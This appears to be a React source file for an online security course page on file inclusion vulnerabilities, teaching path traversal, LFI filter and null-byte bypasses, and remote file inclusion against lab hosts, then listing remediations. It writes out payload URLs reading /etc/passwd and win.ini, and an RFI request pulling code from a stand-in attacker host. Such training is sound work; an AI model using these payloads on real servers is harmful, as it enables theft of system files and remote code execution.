import React from 'react';
import Header from '../../Header/Header';
import courseImage from '../../assets/img/File Inclusion/course_image.png';
import Footer from '../../Footer/Footer';
import '../../Components/Topics CSS/topics.css';
import exampleImage1 from '../../assets/img/File Inclusion/image_1.webp';
import exampleImage2 from '../../assets/img/File Inclusion/image_2.webp';
import exampleImage3 from '../../assets/img/File Inclusion/image_3.webp';
import exampleImage4 from '../../assets/img/File Inclusion/image_4.webp';
import exampleImage5 from '../../assets/img/File Inclusion/image_5.webp';
import exampleImage6 from '../../assets/img/File Inclusion/image_6.webp';
import exampleImage7 from '../../assets/img/File Inclusion/image_7.webp';
import UseFaqSection from '../../Components/UseFaqSection/UseFaqSection.jsx';
import CourseLanding from '../../Components/Landing/CourseLanding.jsx';
export default function FileInclusion() {
  const { faqSectionRef, handleGoToLab } = UseFaqSection();
  const data = {
    title: {
      en: 'File Inclusion',
      ar: 'تضمين الملفات (File Inclusion)',
    },
    description: {
      en: 'Master Local and Remote File Inclusion (LFI/RFI) vulnerabilities. Learn how attackers execute malicious code by manipulating file paths and how to secure your application.',
      ar: 'أتقن ثغرات تضمين الملفات المحلية والبعيدة (LFI/RFI). تعلم كيف يقوم المهاجمون بتنفيذ أكواد خبيثة من خلال التلاعب بمسارات الملفات وكيفية تأمين تطبيقك.',
    },
    difficulty: {
      en: 'Intermediate',
      ar: 'متوسط',
    },
    duration: {
      en: '40 min',
      ar: '40 دقيقة',
    },
    courseImage: courseImage,
    instructor: 'CyberLab',
    rating: '4.7',
    students: '1920',
  };

  return (
    <>
      <Header />
      {/* Start Landing  */}
      <CourseLanding {...data} />
      {/* End Landing  */}
      {/* Start Course Content  */}
      <div className='Content'>
        <div className='secure-container' ref={faqSectionRef}>
          <div className='content-row'>
            <div className='content-section'>
              <dl className='topics-text'>
                {/* Single FAQ Area  */}
                <dt className='fadeInUp faq-header'>
                  <span>Topic 1</span> Introduction
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <h1 className='content__title'>Welcome to File Inclusion</h1>
                  <p>
                    This room aims to equip you with the essential knowledge to
                    exploit file inclusion vulnerabilities, including Local File
                    Inclusion (LFI), Remote File Inclusion (RFI), and directory
                    traversal. Also, we will discuss the risk of these
                    vulnerabilities if they’re found and the required
                    remediation. We provide some practical examples of each
                    vulnerability as well as hands-on challenges.
                  </p>
                  <p>
                    In some scenarios, web applications are written to request
                    access to files on a given system, including images, static
                    text, and so on via parameters. Parameters are query
                    parameter strings attached to the URL that could be used to
                    retrieve data or perform actions based on user input. The
                    following diagram breaks down the essential parts of a URL.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage1} alt='Example' />
                    </div>
                  </div>
                  <p>
                    For example, parameters are used with Google searching,
                    where GET requests pass user input into the search engine.
                    If you are not familiar with the topic, you can view the How{' '}
                    <span>The Web Works</span>
                    module to understand the concept.
                  </p>
                  <p>
                    pLet’s discuss a scenario where a user requests to access
                    files from a webserver. First, the user sends an HTTP
                    request to the webserver that includes a file to display.
                    For example, if a user wants to access and display their CV
                    within the web application, the request may look as follows,
                    <a href='http://webapp.cyberlaps/get.php?file=userCV.pdf'>
                      Click Here
                    </a>
                    , where the file is the parameter and the userCV.pdf, is the
                    required file to access.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage2} alt='Example' />
                    </div>
                  </div>
                  <h2 className='content__title'>
                    Why do File inclusion vulnerabilities happen?
                  </h2>
                  <p>
                    File inclusion vulnerabilities are commonly found and
                    exploited in various programming languages for web
                    applications, such as PHP that are poorly written and
                    implemented. The main issue of these vulnerabilities is the
                    input validation, in which the user inputs are not sanitized
                    or validated, and the user controls them. When the input is
                    not validated, the user can pass any input to the function,
                    causing the vulnerability.
                  </p>
                  <h2 className='content__title'>
                    What is the risk of File inclusion?
                  </h2>
                  <p>
                    By default, an attacker can leverage file inclusion
                    vulnerabilities to leak data, such as code, credentials or
                    other important files related to the web application or
                    operating system. Moreover, if the attacker can write files
                    to the server by any other means, file inclusion might be
                    used in tandem to gain remote command execution (RCE).
                  </p>
                </dd>
                <dt className='fadeInUp faq-header'>
                  <span>Topic 2</span> Path Traversal
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <p>
                    Also known as Directory traversal, a web security
                    vulnerability allows an attacker to read operating system
                    resources, such as local files on the server running an
                    application. The attacker exploits this vulnerability by
                    manipulating and abusing the web application’s URL to locate
                    and access files or directories stored outside the
                    application’s root directory.
                  </p>
                  <p>
                    Path traversal vulnerabilities occur when the user’s input
                    is passed to a function such as file_get_contents in PHP.
                    It’s important to note__new--note that the function is not
                    the main contributor to the vulnerability. Often poor input
                    validation or filtering is the cause of the vulnerability.
                    In PHP, you can use the file_get_contents to read the
                    content of a file. You can find more information about the
                    function{' '}
                    <a href='https://www.php.net/manual/en/function.file-get-contents.php'>
                      Here
                    </a>
                    .
                  </p>
                  <p>
                    The following graph shows how a web application stores files
                    in /var/www/app. The happy path would be the user requesting
                    the contents of userCV.pdf from a defined path
                    /var/www/app/CVs.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage3} alt='Example' />
                    </div>
                  </div>
                  <p>
                    We can test out the URL parameter by adding payloads to see
                    how the web application behaves. Path traversal attacks,
                    also known as the dot-dot-slash attack, take advantage of
                    moving the directory one step up using the double dots ../.
                    If the attacker finds the entry point, which in this case
                    get.php?file=, then the attacker may send something as
                    follows,
                    http://webapp.cyberlaps/get.php?file=../../../../etc/passwd
                  </p>
                  <p>
                    Suppose there isn’t input validation, and instead of
                    accessing the PDF files at /var/www/app/CVs location, the
                    web application retrieves files from other directories,
                    which in this case /etc/passwd. Each .. entry moves one
                    directory until it reaches the root directory /. Then it
                    changes the directory to /etc, and from there, it read the
                    passwd file.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage4} alt='Example' />
                    </div>
                  </div>
                  <p>
                    As a result, the web application sends back the file’s
                    content to the user.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage5} alt='Example' />
                    </div>
                  </div>
                  <p>
                    Similarly, if the web application runs on a Windows server,
                    the attacker needs to provide Windows paths. For example, if
                    the attacker wants to read the boot.ini file located in
                    c:\boot.ini, then the attacker can try the following
                    depending on the target OS version:
                  </p>
                  <p>
                    http://webapp.cyberlaps/get.php?file=../../../../boot.ini or
                  </p>
                  <p>
                    http://webapp.cyberlaps/get.php?file=../../../../windows/win.ini
                  </p>
                  <p>
                    The same concept applies here as with Linux operating
                    systems, where we climb up directories until it reaches the
                    root directory, which is usually c:\.
                  </p>
                  <p>
                    Sometimes, developers will add filters to limit access to
                    only certain files or directories. Below are some common OS
                    files you could use when testing.
                  </p>
                </dd>

                <dt className='fadeInUp faq-header'>
                  <span>Topic 3</span>Local File Inclusion (LFI) #1
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <p>
                    LFI attacks against web applications are often due to a
                    developers’ lack of security awareness. With PHP, using
                    functions such as include, require, include_once, and
                    require_once often contribute to vulnerable web
                    applications. In this room, we’ll be picking on PHP, but
                    it’s worth noting LFI vulnerabilities also occur when using
                    other languages such as ASP, JSP, or even in Node.js apps.
                    LFI exploits follow the same concepts as path traversal.
                  </p>
                  <p>
                    In this section, we will walk you through various LFI
                    scenarios and how to exploit them.
                  </p>
                  <ol>
                    <li>
                      <div className='terminal-container'>
                        <div className='terminal-content'>
                          <div className='terminal-top'>
                            Suppose the web application provides two languages,
                            and the user can select between the EN and AR
                          </div>
                          <pre
                            className='terminal-codelanguage-bash'
                            tabIndex='0'>
                            <code className='language-bash'>
                              <>&lt;</>?PHP
                              <br />
                              include($_GET["lang"]);
                              <br /> ?<>&gt;</>
                            </code>
                          </pre>
                        </div>
                      </div>
                      <p>
                        The PHP code above uses a GET request via the URL
                        parameter lang to include the file of the page. The call
                        can be done by sending the following HTTP request as
                        follows:
                        <a href='http://webapp.cyberlaps/index.php?lang=EN.php'>
                          http://webapp.cyberlaps/index.php?lang=EN.php
                        </a>{' '}
                        to load the English page or
                        <a href='http://webapp.cyberlaps/index.php?lang=AR.php'>
                          http://webapp.cyberlaps/index.php?lang=AR.php
                        </a>{' '}
                        to load the Arabic page, where EN.php and AR.php files
                        exist in the same directory.
                      </p>
                      <p>
                        Theoretically, we can access and display any readable
                        file on the server from the code above if there isn’t
                        any input validation. Let’s say we want to read the
                        /etc/passwd file, which contains sensitive information
                        about the users of the Linux operating system, we can
                        try the following:
                        <a href='http://webapp.cyberlaps/get.php?file=/etc/passwd'>
                          http://webapp.cyberlaps/get.php?file=/etc/passwd
                        </a>
                      </p>
                      <p>
                        In this case, it works because there isn’t a directory
                        specified in the include function and no input
                        validation.
                      </p>
                      Now apply what we discussed and try to read /etc/passwd
                      file.
                    </li>
                    <li>
                      <div className='terminal-container'>
                        <div className='terminal-content'>
                          <div className='terminal-top'>
                            Next, In the following code, the developer decided
                            to specify the directory inside the function.
                          </div>
                          <pre
                            className='terminal-codelanguage-bash'
                            tabIndex='0'>
                            <code className='language-bash'>
                              <>&lt;</>?PHP
                              <br /> include("languages/". $_GET['lang']);
                              <br /> ?<>&gt;</>
                            </code>
                          </pre>
                        </div>
                      </div>
                      <p>
                        In the above code, the developer decided to use the
                        include function to call PHP pages in the languages
                        directory only via lang parameters.
                      </p>
                      <p>
                        If there is no input validation, the attacker can
                        manipulate the URL by replacing the lang input with
                        other OS-sensitive files such as /etc/passwd.
                      </p>
                      <p>
                        Again the payload looks similar to the path traversal,
                        but the include function allows us to include any called
                        files into the current page. The following will be the
                        exploit:
                      </p>
                      <p>
                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                        </a>
                      </p>
                    </li>
                  </ol>
                </dd>
                <dt className='fadeInUp faq-header'>
                  <span>Topic 4</span>Local File Inclusion (LFI) #2
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <p>
                    In this Topicc, we go a little bit deeper into LFI. We
                    discussed a couple of techniques to bypass the filter within
                    the include function.
                  </p>
                  <ol>
                    <li>
                      <p>
                        In the first two cases, we checked the code for the web
                        app, and then we knew how to exploit it. However, in
                        this case, we are performing black box testing, in which
                        we don’t have the source code. In this case, errors are
                        significant in understanding how the data is passed and
                        processed into the web app.
                      </p>
                      <p>
                        In this scenario, we have the following entry point:{' '}
                        <a href='http://webapp.cyberlaps/index.php?lang=EN'>
                          http://webapp.cyberlaps/index.php?lang=EN
                        </a>
                        . If we enter an invalid input, such as cyberlaps, we
                        get the following error
                      </p>
                      <div className='terminal-container'>
                        <div className='terminal-content'>
                          <div class='terminal-top'></div>
                          <pre
                            className='terminal-codelanguage-bash'
                            tabIndex='0'>
                            <code className='language-bash'>
                              Warning: include(languages/cyberlaps.php): failed
                              to open stream: No such file or directory in
                              /var/www/html/cyberlaps-4/index.php on line 12
                            </code>
                          </pre>
                        </div>
                      </div>
                      <p>
                        The error message discloses significant information. By
                        entering cyberlaps as input, an error message shows what
                        the include function looks like:
                        include(languages/cyberlaps.php);.
                      </p>
                      <p>
                        If you look at the directory closely, we can tell the
                        function includes files in the languages directory is
                        adding .php at the end of the entry. Thus the valid
                        input will be something as follows: index.php?lang=EN,
                        where the file EN is located inside the given languages
                        directory and named EN.php.
                      </p>
                      <p>
                        Also, the error message disclosed another important
                        piece of information about the full web application
                        directory path which is /var/www/html/cyberlaps-4/
                      </p>
                      <p>
                        To exploit this, we need to use the ../ trick, as
                        described in the directory traversal section, to get out
                        the current folder. Let’s try the following:
                      </p>
                      <p>
                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                        </a>
                      </p>
                      <p className='note__new--note'>
                        note__new--note that we used 4 ../ because we know the
                        path has four levels /var/www/html/cyberlaps-4. But we
                        still receive the following error:
                      </p>
                      <div className='terminal-container'>
                        <div className='terminal-content'>
                          <div className='terminal-top'></div>
                          <pre
                            className='terminal-codelanguage-bash'
                            tabIndex='0'>
                            <code className='language-bash'>
                              Warning:
                              include(languages/../../../../../etc/passwd.php):
                              failed to open stream: No such file or directory
                              in /var/www/html/cyberlaps-4/index.php on line 12
                            </code>
                          </pre>
                        </div>
                      </div>
                      <p>
                        It seems we could move out of the PHP directory but
                        still, the include function reads the input with .php at
                        the end! This tells us that the developer specifies the
                        file type to pass to the include function. To bypass
                        this scenario, we can use the NULL BYTE, which is %00.
                      </p>
                      <p>
                        Using null bytes is an injection technique where
                        URL-encoded representation such as %00 or 0x00 in hex
                        with user-supplied data to terminate strings. You could
                        think of it as trying to trick the web app into
                        disregarding whatever comes after the Null Byte.
                      </p>
                      <p>
                        By adding the Null Byte at the end of the payload, we
                        tell the include function to ignore anything after the
                        null byte which may look like:
                      </p>
                      <p>
                        include(“languages/../../../../../etc/passwd%00”).”.php”);
                        which equivalent to →
                        include(“languages/../../../../../etc/passwd”);
                      </p>
                      <p className='note__new--note'>
                        note__new--note: the %00 trick is fixed and not working
                        with PHP 5.3.4 and above.
                      </p>
                    </li>
                    <li>
                      <p>
                        In this section, the developer decided to filter
                        keywords to avoid disclosing sensitive information! The
                        /etc/passwd file is being filtered. There are two
                        possible methods to bypass the filter. First, by using
                        the NullByte %00 or the current directory trick at the
                        end of the filtered keyword /.. The exploit will be
                        similar to
                        <a href='http://webapp.cyberlaps/index.php?lang=/etc/passwd/'>
                          http://webapp.cyberlaps/index.php?lang=/etc/passwd/
                        </a>
                        . We could also use
                        <a href='http://webapp.cyberlaps/index.php?lang=/etc/passwd%00'>
                          http://webapp.cyberlaps/index.php?lang=/etc/passwd%00
                        </a>
                        .
                      </p>
                      <p>
                        To make it clearer, if we try this concept in the file
                        system using cd .., it will get you back one step;
                        however, if you do cd ., It stays in the current
                        directory. Similarly, if we try /etc/passwd/.., it
                        results to be /etc/ and that’s because we moved one to
                        the root. Now if we try /etc/passwd/., the result will
                        be /etc/passwd since dot refers to the current
                        directory.
                      </p>
                    </li>
                    <li>
                      <p>
                        Next, in the following scenarios, the developer starts
                        to use input validation by filtering some keywords.
                        Let’s test out and check the error message!
                      </p>
                      <p>
                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                        </a>
                      </p>
                      <p>We got the following error!</p>
                      <div className='terminal-container'>
                        <div className='terminal-content'>
                          <div className='terminal-top'></div>
                          <pre
                            className='terminal-codelanguage-bash'
                            tabIndex='0'>
                            <code className='language-bash'>
                              Warning: include(languages/etc/passwd): failed to
                              open stream: No such file or directory in
                              /var/www/html/cyberlaps-5/index.php on line 15
                            </code>
                          </pre>
                        </div>
                      </div>
                      <p>
                        If we check the warning message in the
                        include(languages/etc/passwd) section, we know that the
                        web application replaces the ../ with the empty string.
                        There are a couple of techniques we can use to bypass
                        this.
                      </p>
                      <p>
                        <b>First</b>, we can send the following payload to
                        bypass it:
                        <br /> ….//….//….//….//….//etc/passwd
                      </p>
                      <p>
                        <b>Why did this work?</b>
                      </p>
                      <p>
                        This works because the PHP filter only matches and
                        replaces the first subset string ../ it finds and
                        doesn’t do another pass, leaving what is pictured below.
                      </p>
                      <div className='Content__img--box'>
                        <div className='Content__img__box__over--hidden'>
                          <img src={exampleImage6} alt='Example' />
                        </div>
                      </div>
                    </li>
                    <li>
                      <p>
                        Finally, we’ll discuss the case where the developer
                        forces the include to read from a defined directory! For
                        example, if the web application asks to supply input
                        that has to include a directory such as:
                        <a href='http://webapp.cyberlaps/index.php?lang=languages/EN.php'>
                          http://webapp.cyberlaps/index.php?lang=languages/EN.php
                        </a>{' '}
                        then, to exploit this, we need to include the directory
                        in the payload like so:
                        ?lang=languages/../../../../../etc/passwd.
                      </p>
                    </li>
                  </ol>
                </dd>
                <dt className='fadeInUp faq-header'>
                  <span>Topic 5</span>Remote File Inclusion (RFI)
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <p>
                    The risk of RFI is higher than LFI since RFI vulnerabilities
                    allow an attacker to gain Remote Command Execution (RCE) on
                    the server. Other consequences of a successful RFI attack
                    include:
                  </p>
                  <ol>
                    <li>Sensitive Information Disclosure</li>
                    <li>Cross-site Scripting (XSS)</li>
                    <li>Denial of Service (DoS)</li>
                  </ol>
                  <p>
                    An external server must communicate with the application
                    server for a successful RFI attack where the attacker hosts
                    malicious files on their server. Then the malicious file is
                    injected into the include function via HTTP requests, and
                    the content of the malicious file executes on the vulnerable
                    application server.
                  </p>
                  <div className='Content__img--box'>
                    <div className='Content__img__box__over--hidden'>
                      <img src={exampleImage7} alt='Example' />
                    </div>
                  </div>
                  <p>RFI steps</p>
                  <p>
                    The following figure is an example of steps for a successful
                    RFI attack! Let’s say that the attacker hosts a PHP file on
                    their own server{' '}
                    <span>http://attacker.cyberlaps/cmd.txt</span> where cmd.txt
                    contains a printing message Hello cyberlaps.
                  </p>
                  <div className='terminal-container'>
                    <div className='terminal-content'>
                      <div class='terminal-top'></div>
                      <pre className='terminal-codelanguage-bash' tabIndex='0'>
                        <code className='language-bash'>
                          <>&lt;</>?PHP echo "Hello cyberlaps"; ?<>&gt;</>
                        </code>
                      </pre>
                    </div>
                  </div>
                  <p>
                    First, the attacker injects the malicious URL, which points
                    to the attacker’s server, such as{' '}
                    <a href='http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt'>
                      http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt
                    </a>{' '}
                    . If there is no input validation, then the malicious URL
                    passes into the include function. Next, the web app server
                    will send a GET request to the malicious server to fetch the
                    file. As a result, the web app includes the remote file into
                    include function to execute the PHP file within the page and
                    send the execution content to the attacker. In our case, the
                    current page somewhere has to show the Hello cyberlaps
                    message.
                  </p>
                  <p>
                    Visit the following lab URL:{' '}
                    <a href='http://MACHINE_IP/playground.php'>
                      http://MACHINE_IP/playground.php
                    </a>{' '}
                    to try out an RFI attack.
                  </p>
                </dd>
                <dt className='fadeInUp faq-header'>
                  <span>Topic 6</span>Remediation
                </dt>
                <dd className='fadeInUp faq-body' id='border-left'>
                  <p>
                    As a developer, it’s important to be aware of web
                    application vulnerabilities, how to find them, and
                    prevention methods. To prevent the file inclusion
                    vulnerabilities, some common suggestions include:
                  </p>
                  <ol>
                    <li>
                      Keep system and services, including web application
                      frameworks, updated with the latest version.
                    </li>
                    <li>
                      Turn off PHP errors to avoid leaking the path of the
                      application and other potentially revealing information.
                    </li>
                    <li>
                      A Web Application Firewall (WAF) is a good option to help
                      mitigate web application attacks.
                    </li>
                    <li>
                      Disable some PHP features that cause file inclusion
                      vulnerabilities if your web app doesn’t need them, such as
                      allow_url_fopen on and allow_url_include.
                    </li>
                    <li>
                      Carefully analyze the web application and allow only
                      protocols and PHP wrappers that are in need.
                    </li>
                    <li>
                      Never trust user input, and make sure to implement proper
                      input validation against file inclusion.
                    </li>
                    <li>
                      Implement whitelisting for file names and locations as
                      well as blacklisting.
                    </li>
                  </ol>
                </dd>
              </dl>
            </div>
            <div className='go-to-section'>
              <button
                onClick={() =>
                  handleGoToLab('/fileinclusion/fileinclusion_lab')
                }
                className='go-to'>
                Go To Labs
              </button>
            </div>
          </div>
        </div>
      </div>
      {/* End Course Content  */}
      <Footer />
    </>
  );
}
